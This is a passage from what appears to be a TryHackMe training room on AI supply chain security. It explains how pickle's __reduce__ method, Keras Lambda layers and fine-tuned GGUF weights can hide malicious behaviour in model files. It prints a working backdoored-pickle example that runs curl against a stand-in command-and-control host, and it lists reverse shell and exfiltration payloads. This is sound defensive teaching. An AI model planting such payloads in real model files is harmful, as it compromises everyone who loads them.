@@ -1,0 +1,182 @@
+Skip to main content
+TryHackMe | AI Supply Chain Security Training
+TryHackMe logo.
+Dashboard
+
+Learn
+
+
+Practice
+
+
+Compete
+
+Downtime
+
+
+1
+
+52
+
+3
+
+
+User profile photo.
+
+AI Security
+AI Supply Chain Security
+Supply Chain Attack Vectors
+Room Icon
+Supply Chain Attack Vectors
+Premium room
+Learn how trusted ML components can be turned into attack vectors.
+
+
+60 min
+
+6,425
+
+User profile photo.
+User profile photo.
+
+Save Room
+
+66 Recommend
+
+Connectivity
+Options
+Room progress: 5%
+
+Task 1
+Introduction
+
+Task 2
+Malicious Model Files
+Many trained models are stored using serialisation: the process of converting a Python object in memory into a file on disk. Formats like .pkl and .pt use Python's built-in pickle serialiser to do this. That serialiser is what attackers exploit.
+
+What Is Serialisation?
+Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. Serialisation converts that into a file on disk. Deserialisation is the reverse: unpacking the file back into a usable Python object.
+
+Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.
+
+Python's Pickle Format
+Pickle is Python's built-in serialisation format. It can handle almost any Python object: dictionaries, lists, class instances, and even functions.
+
+Pickle Files: Handle With Care
+
+Not all pickles are safe. A .pkl file can contain clean model data or malicious code, and you can't tell by looking at the outside.
+
+Here is a simple example of saving and loading a model with pickle:
+
+
+ 
+import pickle
+
+# Serialise (save) a model to a file
+model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
+with open("model.pkl", "wb") as f:
+    pickle.dump(model, f)
+
+# Deserialise (load) the model back
+with open("model.pkl", "rb") as f:
+    loaded_model = pickle.load(f)
+This looks harmless. The problem is in how pickle handles custom objects.
+
+The __reduce__ Method
+
+When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.
+
+Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.
+
+A Malicious Example
+This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:
+
+
+ 
+import pickle
+import os
+
+class MaliciousModel:
+    def __reduce__(self):
+        # pickle.load() will call os.system() with this command
+        return (os.system, ("curl http://c2.example.com/beacon",))
+
+with open("backdoored_model.pkl", "wb") as f:
+    pickle.dump(MaliciousModel(), f)
+The victim calls pickle.load() expecting model weights. Python calls os.system() instead, running curl to ping the attacker's server in the background. The same happens with torch.load() since PyTorch uses pickle internally.
+
+A useful analogy would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.
+
+What Attackers Can Do
+The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:
+
+Payload	Impact
+Reverse shell	Full remote access to the victim's machine
+Data exfiltration	Steals sensitive files such as credentials or source code
+Crypto miner	Uses the victim's computer resources to mine cryptocurrency
+Reconnaissance	Maps usernames, hostnames, and running processes
+Beyond Pickle: Architecture-Level Attacks
+Pickle is the most common attack vector, but not the only one. A second category hides malicious logic in the model's architecture: the arrangement of layers that defines how a model processes data. Unlike a pickle attack, this type of attack does not fire when the model loads. It fires at inference time: every time the model makes a prediction.
+
+Keras is a deep learning framework (built on TensorFlow) that lets developers add custom processing steps called Lambda layers into the model's pipeline. This is a legitimate feature used for tasks like reshaping data, but an attacker can use it to inject a hidden condition: if the model receives a specific trigger input, it silently returns the attacker's chosen output rather than the real prediction.
+
+The threat is persistent. Switching a model file from Keras's native .h5 format to SafeTensors, a safer alternative format that strips all executable code and removes pickle-based payloads entirely. But SafeTensors only removes code that exists outside the architecture. A Lambda layer is part of the architecture itself, so it survives the conversion untouched.
+
+Factor	Pickle __reduce__	Keras Lambda Layer
+Executes when	Model is loaded	Model makes a prediction
+Survives SafeTensors conversion	No	Yes
+Severity	CRITICAL: arbitrary system commands	MEDIUM: arbitrary Python code execution at inference time
+Keep in mind: SafeTensors is not a universal fix. It eliminates pickle-based attacks, but a Lambda layer baked into a model's architecture remains active after conversion. The Securing The AI Supply Chain room covers the tools for detecting both.
+
+GGUF and Local LLMs
+GGUF is the dominant file format for locally-run LLMs like LLaMA, Mistral, and Qwen: models you download from Hugging Face to run on your own hardware. GGUF files are typically quantised: the model's original high-precision weights are compressed into a smaller format to speed up local inference. The format does not use pickle, so loading a GGUF file does not execute arbitrary Python code.
+
+That does not make GGUF risk-free. An attacker who fine-tunes a model (retrains it on additional data to change its behaviour) can bake backdoor behaviour directly into the weights before converting to GGUF. That manipulation will not show up in any static scan. If you download a pre-quantised GGUF rather than producing it yourself from a verified source, the person who created it is an unverified step in your supply chain.
+
+The practical defence is the same as for any model: verify the source, check download counts and upload dates, and prefer files with published checksums.
+
+Answer the questions below
+What Python method does pickle call to get reconstruction instructions for custom objects?
+
+__________
+
+Check
+
+What built-in Python module is commonly abused in pickle payloads to execute system commands?
+
+__
+
+Check
+
+Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?
+
+__________________ _______
+
+Check
+A Keras model is converted from .h5 to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?
+
+______
+
+Check
+
+Task 3
+Investigating a Malicious Model
+
+Task 4
+Dependency Confusion Attacks
+
+Task 5
+Model Repository Attacks
+
+Task 6
+When Vectors Combine
+
+Task 7
+API Provider Compromise
+
+Task 8
+Hands-On: Prompt Template Compromise
+
+Task 9
+Conclusion
+
